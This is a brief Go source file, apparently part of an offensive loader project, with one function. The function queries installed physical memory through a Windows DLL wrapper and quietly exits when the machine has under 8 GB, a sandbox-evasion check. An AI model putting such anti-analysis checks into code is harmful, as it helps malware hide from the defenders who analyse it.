package sandbox

import (
	"os"
	"unsafe"
	"variant/wdll"
)

func GetPhysicalMemory() {
	var proc = wdll.GetPhysicallyInstalledSystemMemory()

	var memory uint64
	_, _, _ = proc.Call(uintptr(unsafe.Pointer(&memory)))

	memory = memory / 1048576
	if memory < 8 {
		os.Exit(0)
	}
}
